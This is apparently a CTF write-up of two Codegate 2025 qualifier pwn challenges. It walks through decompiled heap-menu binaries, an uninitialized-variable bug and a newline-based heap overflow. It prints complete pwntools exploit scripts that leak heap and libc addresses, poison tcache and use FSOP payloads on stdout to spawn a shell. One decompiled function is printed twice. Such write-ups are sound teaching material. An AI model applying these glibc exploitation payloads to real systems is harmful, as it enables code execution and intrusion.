---
layout: post
category: CTF Writeup
tags:
  - Codegate 2025 Quals
date: 2025-03-30 00:00:00 +0900
title: Codegate 2025 Quals - Secret Note & Todo List (pwn)
description: 2-stage FSOP converting 0x10 bytes AAW to shell
---

## Secret Note
### TL;DR
Uninitialized varible use -> relative write from `main_arena` -> FSOP

### Challenge
It has three menus, create/edit/delete.
```c
unsigned __int64 create()
{
  int idx_; // ebx
  int idx; // [rsp+0h] [rbp-30h] BYREF
  unsigned int key; // [rsp+4h] [rbp-2Ch] BYREF
  __int64 v4; // [rsp+8h] [rbp-28h]
  void *buf; // [rsp+10h] [rbp-20h]
  unsigned __int64 v6; // [rsp+18h] [rbp-18h]

  v6 = __readfsqword(0x28u);
  key = 0;
  printf("Index: ");
  __isoc99_scanf("%d", &idx);
  if ( idx < 0 || idx > 15 )
  {
LABEL_9:
    puts("Error");
    return v6 - __readfsqword(0x28u);
  }
  if ( !chunks[idx] )
  {
    idx_ = idx;
    chunks[idx_] = malloc(0x10uLL);
  }
  printf("Key: ");
  __isoc99_scanf("%u", &key);
  if ( key <= 0x1000000 )
  {
    v4 = chunks[idx];
    printf("Size: ");
    __isoc99_scanf("%d", v4 + 8);
    if ( *(int *)(v4 + 8) <= 1024 )
    {
      buf = malloc(*(int *)(v4 + 8));
      if ( buf )
      {
        printf("Data: ");
        read(0, buf, *(int *)(v4 + 8));
        *(_QWORD *)v4 = buf;
        *(_DWORD *)(v4 + 12) = key;
        puts("Save completed");
        return v6 - __readfsqword(0x28u);
      }
    }
    goto LABEL_9;
  }
  printf("Error");
  return v6 - __readfsqword(0x28u);
}
```
`create()` allocates a buffer and copies user input data into it, after validating the provided index (0-15), key (≤0x1000000), and size (≤1024).

```c
unsigned __int64 edit()
{
  int v1; // [rsp+8h] [rbp-18h] BYREF
  int v2; // [rsp+Ch] [rbp-14h] BYREF
  __int64 v3; // [rsp+10h] [rbp-10h]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  v2 = 0;
  printf("Index: ");
  __isoc99_scanf("%d", &v1);
  if ( v1 >= 0
    && v1 <= 15
    && (v3 = chunks[v1]) != 0
    && *(_QWORD *)v3
    && (printf("Key: "), __isoc99_scanf("%u", &v2), *(_DWORD *)(v3 + 12) == v2) )
  {
    printf("Data(%d): ", *(_DWORD *)(v3 + 8));
    read(0, *(void **)v3, *(int *)(v3 + 8));
    puts("Edit completed");
  }
  else
  {
    puts("Error");
  }
  return v4 - __readfsqword(0x28u);
}
```
The `edit()` function allows us to modify the content of a previously allocated buffer at a given index, using the size that was specified during its allocation.

```c
unsigned __int64 delete()
{
  int v1; // [rsp+8h] [rbp-18h] BYREF
  int v2; // [rsp+Ch] [rbp-14h] BYREF
  void *ptr; // [rsp+10h] [rbp-10h]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  v2 = 0;
  printf("Index: ");
  __isoc99_scanf("%d", &v1);
  if ( v1 >= 0
    && v1 <= 15
    && (ptr = (void *)chunks[v1]) != 0LL
    && (printf("Key: "), __isoc99_scanf("%u", &v2), *((_DWORD *)ptr + 3) == v2) )
  {
    free(*(void **)ptr);
    *(_QWORD *)ptr = 0LL;
    *((_DWORD *)ptr + 3) = 0;
    *((_DWORD *)ptr + 2) = 0;
    free(ptr);
    chunks[v1] = 0LL;
    puts("Delete completed");
  }
  else
  {
    puts("Error");
  }
  return v4 - __readfsqword(0x28u);
}
```
`delete()` frees the allocated buffer and its metadata chunk at the given index after validating the key, then clears the entry in the chunks array.

### Vulnerability
There exists two exploitable vulnerabilities.

* Even when allocation fails due to size check (size<=1024), the size field is still updated for the occupied index.
* When key check (key <= 0x1000000) fails, the allocated chunk is left uninitialized where its fields are used as size & ptr to buffer 

I used the latter one.

### Exploit
Exploit scenario is as follows.

* Prepare unsorted bin chunk which will contain the address to main_arena.
* Allocate a metadata chunk from unsorted bin, and fail the key check to keep in uninitialized.
* Now call `edit()` to the uninitialized chunk, and bruteforce the key, which is the top 2 bytes of main_arena.
* Getting the right key will print the size which is the low 4 bytes of main_arena.

Now we have the libc base, and we can write arbitrary from main_arena with `edit()`.

* Overwriting stdout (which is behind the main_arena) with FSOP payload will get the shell.

> One interesting aspect of this exploit was that the main_arena address didn't start with `0x7f` in remote, unlike in the local environment where it always did. Anyways, fixing it in 0x7f still works:)
{: .prompt-tip }

Below is the exploit code I used with brief comments.

```python
def exploit(p):
    create(0, 0, 1000, b"A"*0x10)
    create(1, 1, 1000, b"B"*0x10)
    create(2, 2, 1000, b"C"*0x10)
    create(3, 3, 1000, b"D"*0x10)
    create(4, 4, 1000, b"E"*0x10)
    create(5, 5, 1000, b"F"*0x10)
    create(6, 6, 1000, b"G"*0x10)
    
    ## Unsorted bin chunk
    create(7, 7, 1000, b"H"*0x8)
    ## Avoid consolidation with top chunk
    create(8, 8, 0x10, b"I"*0x8)

    delete(0, 0)
    delete(1, 1)
    delete(2, 2)
    delete(3, 3)
    delete(4, 4)
    delete(5, 5)
    delete(6, 6)
    delete(7, 7)

    # Empty tcache
    create(0, 0, 1000, b"A"*0x10)
    create(1, 1, 1000, b"B"*0x10)
    create(2, 2, 1000, b"C"*0x10)
    create(3, 3, 1000, b"D"*0x10)
    create(4, 4, 1000, b"E"*0x10)
    create(5, 5, 1000, b"F"*0x10)
    create(6, 6, 1000, b"G"*0x10)


    # Empty fastbin for unsorted bin allocation
    create(10, 10, 1024, b"I"*0x8)
    # Allocate from unsorted bin
    # create(11, -1, 0x30, b"A")
    p.sendlineafter(b">", b"1")
    p.sendlineafter(b"Index: ", str(11).encode())
    p.sendlineafter(b"Key: ", str(-1).encode())
    p.recvuntil(b"Error")
    pause()
    ## Now chunks[11] forged with main_arena, guess libc_base
    ## try edit
    libc_base = 0
    for i in range(0x100):
        # context.log_level = "debug"
        p.sendlineafter(b">", b"2")
        p.sendlineafter(b"Index: ", str(11).encode())
        p.sendlineafter(b"Key: ", str(0x7f00+i).encode())
        status =  p.recvn(0x4)
        print(i, hex(0x7f00+i),status)
        if b'Data' != status:
            # pause()
            continue
        status += p.recvuntil(b")")
        print(status)
        # b'Data(-817553664): Edit completed\n'
        # Extract number from Data() output
        data_str = status.decode().split("Data(")[1].split(")")[0]
        data_num = int(data_str)
        if data_num < 0:
            log.info("FAIL")
            exit(0)
            data_num += 0x100000000
        print(f"Found number: {hex(data_num)}")
        # p.sendafter(b"Data", b"A"*0x10)
        print(f"Write start: {hex((0x7f00+i)*0x100000000 + data_num)}")
        if not REMOTE:
            libc_base = (0x7f00+i)*0x100000000 + data_num - 0x203f00
        else:
            libc_base = (0x7f00+i)*0x100000000 + data_num - 0x203b20 - 0x175a0
        
        break
    
    print(f"libc_base: {hex(libc_base)}")
    if libc_base == 0:
        log.info("FAIL")
        return

    def FSOP_struct(flags = 0, _IO_read_ptr = 0, _IO_read_end = 0, _IO_read_base = 0,\
    _IO_write_base = 0, _IO_write_ptr = 0, _IO_write_end = 0, _IO_buf_base = 0, _IO_buf_end = 0,\
    _IO_save_base = 0, _IO_backup_base = 0, _IO_save_end = 0, _markers= 0, _chain = 0, _fileno = 0,\
    _flags2 = 0, _old_offset = 0, _cur_column = 0, _vtable_offset = 0, _shortbuf = 0, lock = 0,\
    _offset = 0, _codecvt = 0, _wide_data = 0, _freeres_list = 0, _freeres_buf = 0,\
    __pad5 = 0, _mode = 0, _unused2 = b"", vtable = 0, more_append = b""):
        
        FSOP = p64(flags) + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base)
        FSOP += p64(_IO_write_base) + p64(_IO_write_ptr) + p64(_IO_write_end)
        FSOP += p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end)
        FSOP += p64(_markers) + p64(_chain) + p32(_fileno) + p32(_flags2)
        FSOP += p64(_old_offset) + p16(_cur_column) + p8(_vtable_offset) + p8(_shortbuf) + p32(0x0)
        FSOP += p64(lock) + p64(_offset) + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf)
        FSOP += p64(__pad5) + p32(_mode)
        if _unused2 == b"":
            FSOP += b"\x00"*0x14
        else:
            FSOP += _unused2[0x0:0x14].ljust(0x14, b"\x00")
        
        FSOP += p64(vtable)
        FSOP += more_append
        return FSOP
    libc = ELF("./libc.so.6")
    ## Fix here ##
    libc.address = libc_base
    _IO_file_jumps = libc.symbols['_IO_file_jumps']
    stdout = libc.symbols['_IO_2_1_stdout_']
    log.info("stdout: " + hex(stdout))
    ############
    
    FSOP = FSOP_struct(flags = u64(b"\x01\x01;sh;\x00\x00"), \
            lock            = libc.symbols['_IO_2_1_stdout_'] + 0x10, \
            _IO_read_ptr    = 0x0, \
            _IO_write_base  = 0x0, \
            _wide_data      = libc.symbols['_IO_2_1_stdout_'] - 0x10, \
            _unused2        = p64(libc.symbols['system'])+ b"\x00"*4 + p64(libc.symbols['_IO_2_1_stdout_'] + 196 - 104), \
            vtable          = libc.symbols['_IO_wfile_jumps'] - 0x20, \
            )
    payload = b"A"* 0x6c0 + FSOP
    pause()
    p.send(payload)

    p.sendline("cat flag")
    p.interactive()
    return

```

## Todo List
### TL;DR
Heap overflow using newline - heap leak with pointer partial overwrite - libc leak with chunk overlapping  - tcache poisoning - FSOP for AAW - FSOP for shell

### Challenge
It has 5 menus - create, edit, delete, complete and load.
```c
unsigned __int64 create()
{
  unsigned int idx; // [rsp+8h] [rbp-18h] BYREF
  int v2; // [rsp+Ch] [rbp-14h]
  void *buf; // [rsp+10h] [rbp-10h]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  buf = 0LL;
  printf("Index: ");
  __isoc99_scanf("%d", &idx);
  if ( idx > 8 )
  {
    puts("Error");
    exit(-1);
  }
  buf = (char *)&todo_list + 24 * (int)idx;
  printf("Title: ");
  v2 = read(0, buf, 0xFuLL);
  if ( *((_BYTE *)buf + v2 - 1) == '\n' )
    *((_BYTE *)buf + v2 - 1) = 0;
  *((_QWORD *)buf + 2) = calloc(1uLL, 0x18uLL);
  if ( !*((_QWORD *)buf + 2) )
  {
    puts("Error");
    exit(-1);
  }
  printf("Desc : ");
  v2 = read(0, *((void **)buf + 2), 0x18uLL);
  if ( *(_BYTE *)(v2 - 1LL + *((_QWORD *)buf + 2)) == '\n' )
    *(_BYTE *)(v2 - 1LL + *((_QWORD *)buf + 2)) = 0;
  puts("Done");
  return v4 - __readfsqword(0x28u);
}
```
The `create()` function takes a title and description from the user. It first prompts for an index (0-8) and stores the title (up to 15 bytes) at an offset from `todo_list` based on that index. Then it allocates a 0x18 byte buffer and stores the description (up to 0x18 bytes) there.

```c
unsigned __int64 edit()
{
  unsigned int v1; // [rsp+8h] [rbp-18h] BYREF
  int v2; // [rsp+Ch] [rbp-14h]
  void **v3; // [rsp+10h] [rbp-10h]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  v3 = 0LL;
  printf("Index: ");
  __isoc99_scanf("%d", &v1);
  if ( v1 > 8 )
  {
    puts("Error");
    exit(-1);
  }
  v3 = (void **)((char *)&todo_list + 24 * (int)v1);
  if ( v3[2] )
  {
    printf("Title: %s\n", (const char *)v3);
    printf("Desc : ");
    v2 = read(0, v3[2], 0x18uLL);
    if ( *((_BYTE *)v3[2] + v2 - 1) == '\n' )
      *((_BYTE *)v3[2] + v2 - 1) = 0;
    puts("Done");
  }
  else
  {
    puts("Error");
  }
  return v4 - __readfsqword(0x28u);
}
```
The `edit()` function allows modifying the description of an existing todo item at a given index. It first validates that the index is within bounds (0-8) and that a description buffer exists at that index. Then it prints the title and prompts for a new description (up to 0x18 bytes).

```c
unsigned __int64 check()
{
  unsigned int idx; // [rsp+Ch] [rbp-14h] BYREF
  const char **v2; // [rsp+10h] [rbp-10h]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  v2 = 0LL;
  printf("Index: ");
  __isoc99_scanf("%d", &idx);
  if ( idx > 8 )
  {
    puts("Error");
    exit(-1);
  }
  v2 = (const char **)((char *)&todo_list + 24 * (int)idx);
  if ( v2[2] )
  {
    printf("Title: %s\n", (const char *)v2);
    printf("Desc : %s\n", v2[2]);
    puts("Done");
  }
  else
  {
    puts("Error");
  }
  return v3 - __readfsqword(0x28u);
}
```
The `check()` function displays the title and description of a todo item at a given index. It first validates that the index is within bounds (0-8). Then it checks if a description buffer exists at that index before printing both the title and description.

```c
unsigned __int64 complete()
{
  size_t v0; // rax
  size_t v1; // rax
  unsigned int idx; // [rsp+8h] [rbp-18h] BYREF
  int fd; // [rsp+Ch] [rbp-14h]
  char *s; // [rsp+10h] [rbp-10h]
  unsigned __int64 v6; // [rsp+18h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  s = 0LL;
  printf("Index: ");
  __isoc99_scanf("%d", &idx);
  if ( idx > 8 )
  {
    puts("Error");
    exit(-1);
  }
  s = (char *)&todo_list + 24 * (int)idx;
  if ( *((_QWORD *)s + 2) )
  {
    fd = open(USER_FILE, 1025);
    if ( fd == -1 )
    {
      puts("Error");
      exit(-1);
    }
    write(fd, "[[", 2uLL);
    v0 = strlen(s);
    write(fd, s, v0);
    write(fd, "||", 2uLL);
    v1 = strlen(*((const char **)s + 2));
    write(fd, *((const void **)s + 2), v1);
    write(fd, "]]\n", 3uLL);
    close(fd);
    free(*((void **)s + 2));
    *((_QWORD *)s + 2) = 0LL;
    memset(s, 0, 0x10uLL);
    printf("Complete todo_%d\n", ++complete_cnt);
    puts("Done");
  }
  else
  {
    puts("Error");
  }
  return v6 - __readfsqword(0x28u);
}
```
The `complete()` function handles marking todo items as completed by saving them to a file and cleaning up the memory. It first validates that the provided index is between 0-8. For a valid todo item (one with a non-null description pointer), it:

1. Opens USER_FILE in append mode 
2. Writes the todo item in a formatted way: `[[title||description]]\n`
3. Cleans up by:
   - Freeing the dynamically allocated description buffer
   - Zeroing out both the title and description pointer
4. Updates the completion counter and prints a success message

```c
unsigned __int64 load()
{
  int v1; // [rsp+Ch] [rbp-74h] BYREF
  int i; // [rsp+10h] [rbp-70h]
  int fd; // [rsp+14h] [rbp-6Ch]
  unsigned int v4; // [rsp+18h] [rbp-68h]
  int v5; // [rsp+1Ch] [rbp-64h]
  void *dest; // [rsp+20h] [rbp-60h]
  void *s; // [rsp+28h] [rbp-58h]
  void *src; // [rsp+30h] [rbp-50h]
  char *v9; // [rsp+38h] [rbp-48h]
  _QWORD v10[7]; // [rsp+40h] [rbp-40h] BYREF
  unsigned __int64 v11; // [rsp+78h] [rbp-8h]
  __int64 savedregs; // [rsp+80h] [rbp+0h] BYREF

  v11 = __readfsqword(0x28u);
  memset(v10, 0, 48);
  dest = 0LL;
  s = 0LL;
  printf("Todo No : ");
  __isoc99_scanf("%d", &v1);
  if ( v1 >= 0 && v1 <= complete_cnt )
  {
    s = malloc(0x18uLL);
    if ( !s )
    {
      puts("Error");
      exit(-1);
    }
    memset(s, 0, 0x18uLL);
    fd = open(USER_FILE, 0);
    if ( fd == -1 )
    {
      puts("Error");
      exit(-1);
    }
    v4 = 0;
    v5 = 0;
    src = 0LL;
    v9 = 0LL;
    for ( i = 0; i < v1; ++i )
    {
      get_line((__int64)v10, 48, fd);
      memset(v10, 0, 0x30uLL);
    }
    get_line((__int64)v10, 48, fd);
    printf("Index: ");
    __isoc99_scanf("%d", &v1);
    if ( (unsigned int)v1 > 8 )
    {
      puts("Error");
      exit(-1);
    }
    dest = (char *)&todo_list + 24 * v1;
    *((_QWORD *)dest + 2) = s;
    src = memchr(v10, 91, 0x30uLL);
    if ( src
      && *((_BYTE *)src + 1) == '['
      && (src = (char *)src + 2,
          v4 = (_DWORD)src - ((unsigned int)&savedregs - 64),
          (v9 = (char *)memchr(src, '|', (int)(48 - v4))) != 0LL)
      && v9[1] == '|' )
    {
      memcpy(dest, src, v9 - (_BYTE *)src);
      src = v9 + 2;
      v4 = (_DWORD)v9 + 2 - ((unsigned int)&savedregs - 64);
      v9 = (char *)memchr(v9 + 2, ']', (int)(48 - v4));
      if ( v9 && v9[1] == ']' )
        memcpy(*((void **)dest + 2), src, v9 - (_BYTE *)src);
      close(fd);
      puts("Done");
    }
    else
    {
      free(*((void **)dest + 2));
      *((_QWORD *)dest + 2) = 0LL;
      memset(dest, 0, 0x10uLL);
      puts("Error");
    }
  }
  else
  {
    puts("Error");
  }
  return v11 - __readfsqword(0x28u);
}
```

```c
unsigned __int64 load()
{
  int v1; // [rsp+Ch] [rbp-74h] BYREF
  int i; // [rsp+10h] [rbp-70h]
  int fd; // [rsp+14h] [rbp-6Ch]
  unsigned int v4; // [rsp+18h] [rbp-68h]
  int v5; // [rsp+1Ch] [rbp-64h]
  void *dest; // [rsp+20h] [rbp-60h]
  void *s; // [rsp+28h] [rbp-58h]
  void *src; // [rsp+30h] [rbp-50h]
  char *v9; // [rsp+38h] [rbp-48h]
  _QWORD v10[7]; // [rsp+40h] [rbp-40h] BYREF
  unsigned __int64 v11; // [rsp+78h] [rbp-8h]
  __int64 savedregs; // [rsp+80h] [rbp+0h] BYREF

  v11 = __readfsqword(0x28u);
  memset(v10, 0, 48);
  dest = 0LL;
  s = 0LL;
  printf("Todo No : ");
  __isoc99_scanf("%d", &v1);
  if ( v1 >= 0 && v1 <= complete_cnt )
  {
    s = malloc(0x18uLL);
    if ( !s )
    {
      puts("Error");
      exit(-1);
    }
    memset(s, 0, 0x18uLL);
    fd = open(USER_FILE, 0);
    if ( fd == -1 )
    {
      puts("Error");
      exit(-1);
    }
    v4 = 0;
    v5 = 0;
    src = 0LL;
    v9 = 0LL;
    for ( i = 0; i < v1; ++i )
    {
      get_line((__int64)v10, 48, fd);
      memset(v10, 0, 0x30uLL);
    }
    get_line((__int64)v10, 48, fd);
    printf("Index: ");
    __isoc99_scanf("%d", &v1);
    if ( (unsigned int)v1 > 8 )
    {
      puts("Error");
      exit(-1);
    }
    dest = (char *)&todo_list + 24 * v1;
    *((_QWORD *)dest + 2) = s;
    src = memchr(v10, 91, 0x30uLL);
    if ( src
      && *((_BYTE *)src + 1) == '['
      && (src = (char *)src + 2,
          v4 = (_DWORD)src - ((unsigned int)&savedregs - 64),
          (v9 = (char *)memchr(src, '|', (int)(48 - v4))) != 0LL)
      && v9[1] == '|' )
    {
      memcpy(dest, src, v9 - (_BYTE *)src);
      src = v9 + 2;
      v4 = (_DWORD)v9 + 2 - ((unsigned int)&savedregs - 64);
      v9 = (char *)memchr(v9 + 2, ']', (int)(48 - v4));
      if ( v9 && v9[1] == ']' )
        memcpy(*((void **)dest + 2), src, v9 - (_BYTE *)src);
      close(fd);
      puts("Done");
    }
    else
    {
      free(*((void **)dest + 2));
      *((_QWORD *)dest + 2) = 0LL;
      memset(dest, 0, 0x10uLL);
      puts("Error");
    }
  }
  else
  {
    puts("Error");
  }
  return v11 - __readfsqword(0x28u);
}
```
The `load()` function loads a completed todo item from the USER_FILE and restores it to the todo list. It works as follows:

1. Takes a todo number (must be between 0 and complete_cnt) and target index (0-8) from user
2. Allocates a 0x18 byte buffer for the description
3. Opens USER_FILE and skips lines until reaching the desired todo item
4. Parses the line in format [[title||description]] and extracts:
   - Title: Copies between [[ and ||
   - Description: Copies between || and ]]
5. Stores the title and description pointer at the specified index in todo_list

### Vulnerability
At first glance, the parsing logic seems safe - the title is extracted between '[[' and '||', and the description between '||' and ']]'. The code also allocates appropriate buffer sizes (0x10 for title, 0x18 for description) that should fit the data.

However, if we include a newline character in the title, we can cause the parsing to end prematurely. This allows the following description to be copied into the title buffer, which leads to a buffer overflow.

### Exploit
We can overwrite the low 4 bytes of pointer to description buffer in the `todo_list`. Exploit scenario using this vuln is as follows.

* Overwrite the lowest byte of `desc` pointer to point any tcache chunk's next.
* Call `check()` to the overwritten todo, leak heap base.
* Overlap chunk for unsorted bin leak
    - allocate todos
    - Overwrite the lowest byte of `desc` pointer to point any chunk - 0x10
    - Overwrite size by calling edit to overwritten `desc`
    - Overwrite the lowest byte of `desc` pointer to point the chunk with overwritten size
    - Free it with `delete()`
    - Call `check` to the freed chunk using pointer achieved during allocation, which will print the address of main_arena.

Now we have heap/libc leak, and by poisoning tcache we can achive AAW of 0x18 bytes. However, this amount of write is not enough for getting shell. Therefore we will use 2 stages of FSOP. First one will overwrite stdin's `_IO_buf_base` & `_IO_buf_end`, and second one will overwrite the entire stdout using the first stage.

* Overwrite some tcache chunk's next to `PROTECT_PTR(_IO_2_1_stdin_ + 0x30)` by modifying `desc` pointer + `edit()`
* Allocate from the tcache chunk

> Note that tcache is not used by `calloc`, therefore by calling `load()` which calls malloc inside, we can get modified chunk from tcache. Also, make sure that the modified chunk is the second last chunk of correspoding tcache bin. (check `mp_.tcache_bins`.) Unless, future allocation will use corrupted pointer at `_IO_2_1_stdin_ + 0x30`.
{: .prompt-tip }

* Overwrite stdin's `_IO_buf_base` to `&_IO_2_1_stdout_` and `_IO_buf_end` to `&_IO_2_1_stdout_+0x1000`.

Now next input from user will be written in `_IO_2_1_stdout_`

* Send FSOP payload through stdin, and next print using stdout will pop the shell.

Below is the exploit code I used.

```python
def exploit(p):
    attach(p)
    for i in range(2, 8):
        create_todo(i, b"A", b"B")
    for i in range(2, 8):
        delete_todo(i)

    payload = b"\x20"
    create_todo(0, b"\n", b"[["+ b"A"*0x10+ payload + b"||")    
    # dummy todo for complete_cnt
    create_todo(1, b"A", b"B")
    complete_todo(0)
    complete_todo(1)

    load_todo(1, 0)
    read_todo(0)

    p.recvuntil(b"Desc : ")
    x = u64(p.recvn(6).ljust(8, b"\x00"))
    heap_base = decrypt(x) - 0x300 
    log.info(f"heap_base: {hex(heap_base)}")


    ## overlapping chunk for unsorted bin leak
    for i in range(2, 7):
        create_todo(i, b"A", b"B")

    create_todo(7, b"A", b"A")
    

    payload = p64(heap_base + 0x430)[:2]
    print(payload)
    create_todo(0, b"\n", b"[["+ b"A"*0x10+ payload + b"||")    
    complete_todo(0)

    # dummy todo for complete_cnt
    create_todo(1, b"A", b"B")
    complete_todo(1)
    create_todo(1, b"A", b"B")
    complete_todo(1)

    load_todo(4, 0)


    size = 0x501
    edit_todo(0, p64(0) + p64(size))

    for i in range(0x500//0x20):
        create_todo(3, b"A", p64(0) + p64(0x21))


    payload = p64(heap_base + 0x440)[:2]
    print(payload)
    create_todo(0, b"\n", b"[["+ b"A"*0x10+ payload + b"||")    
    complete_todo(0)

    # dummy todo for complete_cnt
    for i in range(3):
        create_todo(1, b"A", b"B")
        complete_todo(1)

    load_todo(8, 0)
    delete_todo(0)
    read_todo(7)
    p.recvuntil(b"Desc : ")
    libc_base = u64(p.recvn(6).ljust(8, b"\x00")) - 0x203b20
    log.info(f"libc_base: {hex(libc_base)}")


    ## overwrite tcache->entry
    payload = p64(heap_base + 0x480)[:2]
    print(payload)
    create_todo(0, b"\n", b"[["+ b"A"*0x10+ payload + b"||")    
    complete_todo(0)

    # dummy todo for complete_cnt
    for i in range(4):
        create_todo(1, b"A", b"B")
        complete_todo(1)
    load_todo(13, 0)


    ## empty tcache
    for i in range(7):
        load_todo(2, 7)
    create_todo(6, b"A", b"B")
    create_todo(7, b"A", b"B")
    delete_todo(6)
    delete_todo(7)

    libc = ELF("./libc.so.6") 
    libc.address = libc_base
    _IO_2_1_stdin_ = libc.symbols["_IO_2_1_stdin_"]
    _IO_2_1_stdout_ = libc.symbols["_IO_2_1_stdout_"]
    log.info(f"_IO_2_1_stdin_: {hex(_IO_2_1_stdin_)}")

    edit_todo(0, p64(encrypt(_IO_2_1_stdin_ + 0x30)))
    load_todo(2, 1)
    load_todo(2, 2)
    pause()

    edit_todo(2, p64(_IO_2_1_stdout_)*2 + p64(_IO_2_1_stdout_ + 0x1000))
    pause()



    def FSOP_struct(flags = 0, _IO_read_ptr = 0, _IO_read_end = 0, _IO_read_base = 0,\
    _IO_write_base = 0, _IO_write_ptr = 0, _IO_write_end = 0, _IO_buf_base = 0, _IO_buf_end = 0,\
    _IO_save_base = 0, _IO_backup_base = 0, _IO_save_end = 0, _markers= 0, _chain = 0, _fileno = 0,\
    _flags2 = 0, _old_offset = 0, _cur_column = 0, _vtable_offset = 0, _shortbuf = 0, lock = 0,\
    _offset = 0, _codecvt = 0, _wide_data = 0, _freeres_list = 0, _freeres_buf = 0,\
    __pad5 = 0, _mode = 0, _unused2 = b"", vtable = 0, more_append = b""):
        
        FSOP = p64(flags) + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base)
        FSOP += p64(_IO_write_base) + p64(_IO_write_ptr) + p64(_IO_write_end)
        FSOP += p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end)
        FSOP += p64(_markers) + p64(_chain) + p32(_fileno) + p32(_flags2)
        FSOP += p64(_old_offset) + p16(_cur_column) + p8(_vtable_offset) + p8(_shortbuf) + p32(0x0)
        FSOP += p64(lock) + p64(_offset) + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf)
        FSOP += p64(__pad5) + p32(_mode)
        if _unused2 == b"":
            FSOP += b"\x00"*0x14
        else:
            FSOP += _unused2[0x0:0x14].ljust(0x14, b"\x00")
        
        FSOP += p64(vtable)
        FSOP += more_append
        return FSOP
    
    ## Fix here ##
    libc.address = libc_base
    _IO_file_jumps = libc.symbols['_IO_file_jumps']
    stdout = libc.symbols['_IO_2_1_stdout_']
    log.info("stdout: " + hex(stdout))
    ############
    
    FSOP = FSOP_struct(flags = u64(b"\x01\x01;sh;\x00\x00"), \
            lock            = libc.symbols['_IO_2_1_stdout_'] + 0x10, \
            _IO_read_ptr    = 0x0, \
            _IO_write_base  = 0x0, \
            _wide_data      = libc.symbols['_IO_2_1_stdout_'] - 0x10, \
            _unused2        = p64(libc.symbols['system'])+ b"\x00"*4 + p64(libc.symbols['_IO_2_1_stdout_'] + 196 - 104), \
            vtable          = libc.symbols['_IO_wfile_jumps'] - 0x20, \
            )

    # payload = b"7" + b" "*5 + p64(libc.symbols['_IO_2_1_stdout_'] + 0x10)
    # payload += p64(-1) + p64(0) + p64(libc_base + 0x2039c0)
    # payload += p64(0)*3 + p32(-1) + p32(0) + p64(0) + p64(0) + p64(libc_base + 0x202030)
    # payload += b"A"*0xc00
    payload = FSOP

    p.sendlineafter(b"> ", payload)
    p.interactive()
    return
``` 

